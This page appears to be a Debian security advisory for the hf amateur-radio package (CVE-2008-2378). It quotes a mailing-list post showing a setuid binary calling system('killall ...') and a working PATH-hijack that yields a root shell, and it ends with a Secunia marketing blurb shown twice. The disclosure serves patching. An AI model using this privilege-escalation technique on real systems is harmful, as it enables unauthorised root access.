Package        : hf
Vulnerability  : programming error
Problem type   : local
Debian-specific: no
CVE Id(s)      : CVE-2008-2378
Debian Bug     : 504182

Steve Kemp discovered that hf, an amateur-radio protocol suite using
a soundcard as a modem, insecurely tried to execute an external command
which could lead to the elevation of privileges for local users.

For the stable distribution (etch), this problem has been fixed in version
0.7.3-4etch1.

For the unstable distribution (sid), this problem has been fixed in
version 0.8-8.1.

We recommend that you upgrade your hf package.

Upgrade instructions
- --------------------

wget url
        will fetch the file for you
dpkg -i file.deb
        will install the referenced file.

If you are using the apt-get package manager, use the line for
sources.list as given below:

apt-get update
        will update the internal database
apt-get upgrade
        will install corrected packages

You may use an automated update by adding the resources from the
footer to the proper configuration.

Subject: [Secure-testing-team] hf - [CVE-2008-2378](https://security-tracker.debian.org/tracker/CVE-2008-2378) - local root exploit

 The hf package, Described by Debian as an amateur-radio protocol suite
 using a soundcard as a modem, is a program that eventually becomes
 setuid(0), and has a trivial security hole in it.

 By default the package installs "/usr/bin/hfkernel" as a typical binary,
 but when first started via the program "hf" the binary is changed to
 be setuid(root).

 This is demonstrated:

skx@gold:~$ hf
Hello I am hf, the startscript for hfterm & hfkernel.
I look for them in /usr/bin. If wrong, edit me.
hfkernel must run with root rights.
The suid bit has to be set. Be aware that this can be a security hole.
Please do as root "chmod 4755 /usr/bin/hfkernel".
or start this script again as root.

 If you do start the program as root the permissions are changed:

skx@gold:~$ sudo hf
Hello I am hf, the startscript for hfterm & hfkernel.
I look for them in /usr/bin. If wrong, edit me.
hfkernel must run with root rights.
The suid bit has to be set. But be aware that this can be a security hole.
I will do this now "chmod 4755 /usr/bin/hfkernel".
For you, root, I will start only hfkernel for test purposes.
...

  Now the program is setuid:

skx@gold:~$ ls -l /usr/bin/hfkernel
-rwsr-xr-x 1 root root 244120 2008-05-07 19:37 /usr/bin/hfkernel

  Unfortunately the hfkernel program contains a trivial root hole:

int main(int argc, char *argv[])
{
        // snip
        while ((c = getopt(argc, argv, "a:M:c:klhip:m:nt:s:r:Rf23")) != -1)
            switch (c) {

            // snip

                case 'k':
                    system ("killall hfkernel");

            //
}

  Creating ~/bin/killall is sufficient to gain root privileges.

skx@gold:~$ echo -e '#!/bin/sh\n/bin/sh' > ~bin/killall
skx@gold:~$ chmod 755 ~/bin/killall
skx@gold:~$ hfkernel -k
sh-3.2# id
uid=1000(skx) gid=1000(skx) euid=0(root)

  This has been given the identifier [CVE-2008-2378](https://security-tracker.debian.org/tracker/CVE-2008-2378).

  Below is the patch that I've come up with to fix this hole, which
 is a simple pidfile approach.  Unless anybody has any comments
 I'll upload a fix for Etch on Monday/Tuesday.

Steve

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the worldâ€™s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoftâ€™s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that arenâ€™t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the worldâ€™s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoftâ€™s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that arenâ€™t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
